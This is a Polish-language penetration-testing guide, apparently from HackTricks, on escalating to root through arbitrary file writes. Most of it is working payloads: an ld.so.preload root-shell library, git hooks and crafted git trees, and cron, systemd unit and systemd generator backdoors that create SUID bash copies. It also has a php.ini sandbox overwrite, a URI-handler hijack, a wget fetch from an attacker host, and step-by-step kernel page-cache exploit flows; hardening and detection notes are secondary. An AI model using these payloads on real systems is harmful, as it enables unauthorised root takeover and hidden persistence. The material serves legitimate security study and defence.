# Dowolny zapis pliku z uprawnieniami root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` to systemowa lista shared objects, które dynamic linker ładuje przed innymi shared objects. Tryb secure-execution nakłada dodatkowe ograniczenia na preloading, więc ścieżka biblioteki, taka jak `/tmp/pe.so`, nie jest uniwersalną techniką dla plików binarnych SUID.\
Jeśli możesz utworzyć lub zmodyfikować ten plik, proces, który go ładuje, załaduje wymienioną bibliotekę przed pozostałymi shared objects, umożliwiając wykonanie kodu w kontekście tego procesu.<sup>[[12]](#references)</sup>

Na przykład: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** to wykonywalne skrypty uruchamiane podczas zdarzeń w repozytorium, w tym operacji commit i merge. Jeśli **uprzywilejowany skrypt lub użytkownik** wykonuje te działania, a atakujący może **zapisywać w folderze `.git`**, hook może zostać użyty do **eskalacji uprawnień**.<sup>[[13]](#references)</sup>

Na przykład można **wygenerować skrypt** w repozytorium git w **`.git/hooks`**, aby był zawsze uruchamiany po utworzeniu nowego commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Path traversal w eksporcie uprzywilejowanego drzewa Git

Uprzywilejowany synchronizator może pominąć checkout i zamiast tego wyliczyć zawartość repozytorium kontrolowanego przez atakującego za pomocą `git ls-tree`, odczytać każdy blob poleceniem `git cat-file`, połączyć zgłoszoną nazwę ścieżki z katalogiem stagingowym i samodzielnie ją zapisać. Staje się to **dowolnym zapisem pliku z uprawnieniami synchronizatora**, gdy łączy `-c safe.directory=*` (wyłączając mechanizm Git chroniący repozytoria należące do innego właściciela) z brakiem sprawdzania, czy ścieżka docelowa pozostaje w dozwolonym katalogu. Absolutna nazwa wpisu drzewa sprawia, że `os.path.join(stage, name)` w Pythonie ignoruje `stage`; względna nazwa zawierająca `../` wydostaje się poza katalog po rozwiązaniu jej przez system plików. Ponieważ aplikacja materializuje surowe drzewo zamiast prosić Git o wykonanie checkoutu, odrzucanie nazw ścieżek podczas checkoutu nigdy nie chroni miejsca docelowego.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Szukaj takiej postaci kodu w usługach root, timerach, agentach wdrożeniowych, importerach szablonów oraz zadaniach backupu/przywracania:<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
Wpis drzewa jest kodowany jako `<mode> SP <name> NUL <raw object ID>`. Opcja `git hash-object --literally` celowo zezwala na dane obiektu, które mogą zostać odrzucone przez standardowe parsowanie lub `git fsck`, dzięki czemu tymczasowy klon może utworzyć drzewo, którego nazwa pliku jest absolutną ścieżką docelową. Ten przykład tworzy blob pliku cron, opakowuje spreparowane drzewo w commit i przesuwa do niego branch; do przeprowadzenia exploita nadal wymagane są uprawnienia do aktualizacji repozytorium używanego przez uprzywilejowane zadanie oraz serwer Git akceptujący nieprawidłowy obiekt.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
Hardening musi obejmować zarówno pobieranie danych z repozytorium, jak i końcową operację na systemie plików:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Zastąp `safe.directory=*` dokładnymi repozytoriami, którym usługa musi ufać, oraz, jeśli to możliwe, przetwarzaj repozytoria bez uprawnień root.
- Odrzucaj nazwy absolutne oraz wszelkie komponenty `.` lub `..` przed materializacją. Po połączeniu ścieżek wykonaj kanonikalizację i sprawdź, czy miejsce docelowe nadal znajduje się w obrębie zamierzonego katalogu głównego.
- Unikaj wyścigów symlinków typu check-then-open: otwieraj ścieżki względnie względem zaufanego deskryptora katalogu, a w systemie Linux używaj `openat2()` z `RESOLVE_BENEATH` oraz `RESOLVE_NO_SYMLINKS` dla ścieżek kontrolowanych przez atakującego.
- Preferuj zwykły checkout w odizolowanym katalogu zamiast ponownego implementowania checkoutu na podstawie danych wyjściowych plumbing. Jeśli wymagane jest pobieranie raw-object, włącz walidację po stronie receive, na przykład `receive.fsckObjects=true`; nie obniżaj poziomu ustaleń `receive.fsck.*` związanych ze ścieżkami, które są potrzebne do odrzucania spreparowanych drzew.

### Pliki Cron i czasu

Jeśli możesz **zapisywać pliki związane z cronem, które są wykonywane przez root**, zazwyczaj możesz uzyskać code execution przy następnym uruchomieniu zadania. Interesujące cele obejmują:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Własny crontab użytkownika root w `/var/spool/cron/` lub `/var/spool/cron/crontabs/`
- Timery `systemd` oraz usługi, które uruchamiają

Szybkie sprawdzenia:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Typowe ścieżki nadużycia:

- **Dodanie nowego zadania root cron** do `/etc/crontab` lub pliku w `/etc/cron.d/`
- **Zastąpienie skryptu** już wykonywanego przez `run-parts`
- **Dodanie backdoora do istniejącego celu timera** poprzez modyfikację uruchamianego przez niego skryptu lub pliku binarnego

Minimalny przykład payloadu cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Jeśli możesz zapisywać wyłącznie w katalogu cron używanym przez `run-parts`, umieść tam plik wykonywalny:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Uwagi:

- `run-parts` zwykle pomija nazwy plików zawierające kropki, dlatego preferuj nazwy takie jak `backup` zamiast `backup.sh`.<sup>[[15]](#references)</sup>
- Niektóre systemy używają timerów `systemd` zamiast klasycznego crona, ale idea nadużycia jest taka sama: **zmodyfikuj to, co root wykona później**.<sup>[[20]](#references)</sup>

### Pliki usług i socketów

Jeśli możesz zapisywać **pliki jednostek `systemd`** lub pliki, do których się odwołują, możesz uzyskać code execution jako root przez przeładowanie i ponowne uruchomienie jednostki albo przez zaczekanie, aż zadziała ścieżka aktywacji usługi/socketu.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Interesujące cele obejmują:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Nadpisania drop-in w `/etc/systemd/system/<unit>.d/*.conf`
- Skrypty/binaria usług wskazane przez `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Zapisywalne ścieżki `EnvironmentFile=`, ładowane przez usługę uruchamianą jako root

Szybkie sprawdzenia:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Typowe ścieżki nadużyć:

- **Nadpisanie `ExecStart=`** w należącej do root jednostce service, którą możesz modyfikować
- **Dodanie drop-in override** ze złośliwym `ExecStart=` i wcześniejsze wyczyszczenie starego wpisu
- **Backdoorowanie skryptu/binarnego pliku** już wskazanego przez jednostkę
- **Przejęcie usługi aktywowanej przez socket** poprzez modyfikację odpowiadającego jej pliku `.service`, który jest uruchamiany po odebraniu połączenia przez socket

Przykładowy złośliwy override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Typowy przebieg aktywacji:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Jeśli nie możesz samodzielnie restartować usług, ale możesz edytować jednostkę aktywowaną przez socket, być może wystarczy **poczekać na połączenie klienta**, aby uruchomić backdoored service jako root.<sup>[[17]](#references)</sup>

### Katalogi generatorów systemd

**Generatory systemowe** to pliki wykonywalne uruchamiane przez system manager przed załadowaniem plików jednostek, zarówno podczas bootowania, jak i przeładowywania konfiguracji. Dlatego dostęp do zapisu w katalogu generatora systemowego (lub do istniejącego generatora będącego plikiem wykonywalnym) jest bezpośrednim mechanizmem wykonywania kodu jako root, który łatwo przeoczyć, gdy audyt sprawdza wyłącznie pliki `*.service` i `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

Zwykła kolejność wyszukiwania to `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` oraz `/usr/lib/systemd/system-generators/` (niektóre dystrybucje udostępniają `/lib/systemd/system-generators/` za pośrednictwem połączenia `/usr`). Plik wykonywalny o tej samej nazwie w katalogu znajdującym się wcześniej na liście przesłania późniejszy. Nie należy mylić tych **katalogów wejściowych plików wykonywalnych** z `/run/systemd/generator`, `/run/systemd/generator.early` i `/run/systemd/generator.late`, które zawierają tymczasowy output jednostek generowany przez generatory.<sup>[[35]](#references)</sup>

Szybkie sprawdzenia:
```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
/usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
/lib/systemd/system-generators; do
[ -e "$d" ] || continue
namei -l "$d"
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
getfacl -p "$d" "$d"/* 2>/dev/null
done
```
Nowo utworzony generator musi mieć ustawiony bit wykonywalności. Jeśli prymityw zapisu kontroluje bajty, ale nie tryb, wskaż istniejący wykonywalny generator; jego obcięcie w miejscu zwykle zachowuje metadane. Jeśli sam katalog jest zapisywalny, utwórz nowy wpis i oznacz go jako wykonywalny.<sup>[[35]](#references)</sup>
```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```
Wywołanie `systemctl daemon-reload` względem menedżera **systemowego** wymaga odpowiedniej autoryzacji, ale ponownie uruchamia każdy generator systemowy; w przeciwnym razie należy zaczekać na uprzywilejowane przeładowanie, operację pakietową lub reboot. Katalogi user-generator, takie jak `~/.config/systemd/user-generators/`, są wykonywane przez menedżera użytkownika i same z siebie **nie** zapewniają uprawnień root.<sup>[[35]](#references)</sup>

W celu hardeningu i huntingu należy zweryfikować każdy element ścieżki oraz ACL, a nie tylko końcowe bity uprawnień, utworzyć baseline hashy/właścicieli pakietowych generatorów oraz generować alerty dotyczące tworzenia, zmiany nazwy, zawartości lub uprawnień we wszystkich katalogach wejściowych generatorów systemowych. Monitorowanie zapisu jest ważne, ponieważ one-shot generator może usunąć się po wykonaniu, podczas gdy wygenerowane drzewo unitów w `/run/systemd/generator*` jest odbudowywane przy następnym przeładowaniu.<sup>[[35]](#references)[[36]](#references)</sup>

### Nadpisanie restrykcyjnego `php.ini` używanego przez uprzywilejowany sandbox PHP

Niektóre niestandardowe daemony weryfikują kod PHP dostarczony przez użytkownika, uruchamiając `php` z **restrykcyjnym `php.ini`** (na przykład `disable_functions=exec,system,...`). Jeśli kod uruchamiany w sandboxie nadal ma **dowolną możliwość zapisu** (taką jak `file_put_contents`) i możesz uzyskać dostęp do **dokładnej ścieżki `php.ini`** używanej przez daemon, możesz **nadpisać tę konfigurację**, aby usunąć ograniczenia, a następnie przesłać drugi payload uruchamiany z podwyższonymi uprawnieniami.<sup>[[2]](#references)</sup>

Typowy przebieg:

1. Pierwszy payload nadpisuje konfigurację sandboxa.
2. Drugi payload wykonuje kod po ponownym włączeniu niebezpiecznych funkcji.

Minimalny przykład (zastąp ścieżkę używaną przez daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Jeśli daemon działa jako root (lub przeprowadza walidację z użyciem ścieżek należących do root), drugie wykonanie zapewnia kontekst root. Jest to zasadniczo **privilege escalation via config overwrite**, gdy sandboxed runtime nadal może zapisywać pliki.

### binfmt_misc

`binfmt_misc` udostępnia rejestracje w `/proc/sys/fs/binfmt_misc`; każda rejestracja kojarzy wzorzec typu pliku z interpreterem. Wpływ na uprawnienia zależy od tego, kto może zmieniać rejestrację oraz który proces później wykonuje pasujący plik, dlatego przed potraktowaniem tego jako ścieżki privilege escalation należy zweryfikować te wymagania.<sup>[[21]](#references)</sup>

### Nadpisywanie schema handlers (like http: or https:)

Desktop environments używają skojarzeń MIME i desktop entries do wyboru aplikacji dla URI schemes; attacker, który może zapisywać w odpowiednich katalogach per-user configuration i desktop-entry, może przekierować te schemes do launchera znajdującego się pod jego kontrolą. Modyfikując plik `$HOME/.config/mimeapps.list` tak, aby wskazywał HTTP i HTTPS URL handlers na malicious file (na przykład `x-scheme-handler/http=evil.desktop` oraz `x-scheme-handler/https=evil.desktop`), kliknięcie użytkownika może uruchomić ten desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root wykonujący skrypty/pliki binarne zapisywalne przez użytkownika

Jeśli uprzywilejowany workflow uruchamia coś takiego jak `/bin/sh /home/username/.../script` (lub dowolny plik binarny znajdujący się w katalogu należącym do nieuprzywilejowanego użytkownika), możesz to przejąć:<sup>[[1]](#references)</sup>

- **Wykryj wykonanie:** monitoruj procesy za pomocą pspy, aby wykryć, kiedy root wywołuje ścieżki kontrolowane przez użytkownika.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** upewnij się, że zarówno docelowy plik, jak i jego katalog są własnością Twojego użytkownika i można w nich zapisywać.
- **Hijack the target:** wykonaj kopię zapasową oryginalnego binary/script i umieść payload tworzący shell SUID (lub wykonujący dowolne inne działanie jako root), a następnie przywróć uprawnienia:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (np. naciśnięcie przycisku UI, który uruchamia helper). Gdy root ponownie wykona przejętą ścieżkę, uzyskaj escalated shell za pomocą `./rootshell -p`.

### Modyfikacja uprzywilejowanych plików binarnych wyłącznie w page cache

Niektóre błędy kernela nie modyfikują pliku **na dysku**. Zamiast tego pozwalają modyfikować wyłącznie kopię pliku **w page cache**. Jeśli można zaatakować plik binarny **setuid** lub w inny sposób **wykonywany przez root**, jego następne wykonanie może uruchomić kontrolowane przez attackera bajty z pamięci i doprowadzić do eskalacji uprawnień, mimo że hash pliku na dysku pozostaje bez zmian.<sup>[[3]](#references)[[4]](#references)</sup>

Warto postrzegać to jako **runtime-only file write primitive**:<sup>[[3]](#references)</sup>

- **Dysk pozostaje czysty**: inode i bajty zapisane na dysku nie zmieniają się
- **Pamięć jest zmodyfikowana**: procesy odczytujące lub wykonujące zawartość cached page otrzymują treść zmodyfikowaną przez attackera
- **Efekt jest tymczasowy**: zmiana znika po restarcie lub usunięciu strony z cache

Ten primitive znajduje się pomiędzy klasycznym **arbitrary file write** a starszymi bugami wykorzystującymi **page cache**, takimi jak Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW opierał się na race condition
- Dirty Pipe miał ograniczenia dotyczące pozycji zapisu
- Primitive działający wyłącznie w page cache może być bardziej niezawodny, jeśli podatna ścieżka umożliwia bezpośredni zapis do cached file-backed pages

#### Generic privesc flow

1. Uzyskaj kernel primitive umożliwiający zapis do **file-backed page cache pages**
2. Użyj go przeciwko **readable privileged binary** lub innemu plikowi wykonywanemu przez root
3. Uruchom wykonanie **zanim** strona zostanie usunięta z cache
4. Uzyskaj code execution jako root, podczas gdy plik na dysku nadal wygląda na niezmodyfikowany

Typowe cele o wysokiej wartości:

- Binarne pliki **setuid-root**
- Helpery uruchamiane przez **root services**
- Binarne pliki często wykonywane z poziomu **containers sharing the host kernel/page cache**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) jest dobrym przykładem tej klasy. Podatna ścieżka znajdowała się w userspace API kryptografii Linuxa (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` może przenosić referencje do page-cache pages z readable file do crypto TX scatterlist
- ścieżka deszyfrowania `algif_aead` in-place ponownie wykorzystywała bufory źródłowe i docelowe
- `authencesn` następnie zapisywał do docelowego obszaru tagu
- gdy ten obszar nadal wskazywał na spliced file-backed pages, zapis trafiał do **page cache pliku docelowego**

Interesująca technika nie polega więc na samym CVE, lecz na następującym wzorcu:

- **przekazanie file-backed cache pages do kernel subsystem**
- sprawienie, aby subsystem **traktował je jako writable output**
- wywołanie niewielkiego, kontrolowanego nadpisania w pamięci

Publiczny PoC używał wielokrotnych **4-byte writes** do spatchowania `/usr/bin/su` w pamięci, a następnie go wykonywał.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) pokazuje inny wariant tego samego wzorca **page-cache-only write-to-root**, tym razem jednak sinkiem jest **IPsec ESP decrypt**, a nie `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Kluczową techniką jest **metadata-laundering step**:

- `splice()` umieszcza **read-only file-backed page-cache page** w pakiecie ESP-in-UDP
- pierwotna mitigacja DirtyFrag oznaczała ten skb flagą `SKBFL_SHARED_FRAG`, aby `esp_input()` wykonywał **copy before decrypting**
- netfilter `TEE` duplikuje pakiet przez `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- clone zachowuje **tę samą fizyczną referencję do page-cache**, ale traci `SKBFL_SHARED_FRAG`
- `esp_input()` uznaje następnie clone za bezpieczny i wykonuje deszyfrowanie **in-place `cbc(aes)`** na file-backed page

Wniosek dla reviewera jest szerszy niż samo CVE: jeśli mitigacja zależy od **skb/page metadata** przy ustalaniu, czy operacja musi najpierw wykonać copy, dowolna **clone/copy path, która zachowuje backing page, ale usuwa metadata**, może po cichu ponownie otworzyć write primitive.

Typowy exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` w celu uzyskania **`CAP_NET_ADMIN` w prywatnym network namespace**
2. podnieś loopback i zainstaluj regułę **netfilter `TEE`** w `mangle/OUTPUT`
3. zainstaluj **XFRM ESP transport SAs** przez `NETLINK_XFRM`
4. zakoduj każde docelowe słowo 4-bajtowe w polu `seq_hi` SA (trick wyboru słowa z DirtyFrag)
5. wyślij spliced pakiet ESP-in-UDP, aby **TEE clone** dotarł do `esp_input()` i wykonał deszyfrowanie **in place**
6. powtarzaj, aż kopia `/usr/bin/su` w page cache lub inny uprzywilejowany executable będzie zawierać kod kontrolowany przez attackera

Z punktu widzenia działania wpływ jest taki sam jak w przykładzie z `AF_ALG`: plik na dysku pozostaje czysty, ale `execve()` korzysta ze **zmodyfikowanych bajtów page cache** i zapewnia root.<sup>[[8]](#references)[[9]](#references)</sup>

Przydatne checks dotyczące ekspozycji na ten wariant:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Krótkoterminowe ograniczenie powierzchni ataku jest tutaj również zależne od ścieżki: aktualizacja do kernela zawierającego `48f6a5356a33` naprawia ścieżkę klonowania, natomiast zablokowanie automatycznego ładowania `xt_TEE` usuwa **etap prania flagi**, a zablokowanie `esp4` / `esp6` usuwa **miejsce docelowe deszyfrowania**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Wykrywanie ekspozycji i polowanie

Jeśli podejrzewasz tę klasę błędów, nie polegaj wyłącznie na kontrolach integralności dysku. Sprawdź również:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Poniższe wartości konfiguracji odróżniają interfejs ładowalny od interfejsu wbudowanego w kernel; reguły budowania crypto mapują `CONFIG_CRYPTO_USER_API_AEAD` na `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` może być ładowany/usuwany jako module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfejs jest wbudowany w kernel
- binaria setuid są dobrymi celami, ponieważ patch dotyczący wyłącznie page cache może wystarczyć, aby zamienić lokalny foothold w root

#### Redukcja attack surface dla ścieżki `algif_aead`

Jeśli podatny interfejs jest dostarczany przez loadable module:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Jeśli zostanie skompilowane do jądra, w niektórych ujawnionych przypadkach zgłaszano blokowanie ścieżki init za pomocą:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Ten rodzaj mitigacji warto pamiętać także w przypadku innych kernel LPE: jeśli exploitation zależy od konkretnego opcjonalnego interfejsu, wyłączenie tego interfejsu lub umieszczenie go na blacklist może przerwać ścieżkę exploita, nawet zanim będzie dostępna pełna aktualizacja kernela.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – przejęcie skryptu wykonywanego jako root w katalogu PaperCut zapisywalnym przez użytkownika](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) — FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Ujawnienie Openwall oss-security dotyczące CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Poprawka Linux stable: crypto: algif_aead — powrót do działania out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — advisory dotyczące CVE-2026-31431](https://copy.fail/)
- [7] [Theori / Xint — technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repozytorium DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: analiza i exploitation wariantu Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Poprawka Linux: net: skb: zachowanie `SKBFL_SHARED_FRAG` w `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Wcześniejsza mitigation Linux: ustawienie `SKBFL_SHARED_FRAG` dla pakietów UDP połączonych przez splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — strona podręcznika Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — strona podręcznika Debiana](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — dokumentacja Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Powiązania aplikacji MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Specyfikacja Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Specyfikacja Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Język Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile Linux crypto](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: podatność page cache AF_ALG w jądrze Linux](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Dokumentacja Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Dokumentacja Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Dokumentacja konfiguracji Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — strona podręcznika Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Dokumentacja generatora systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: mechanizmy persistence](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
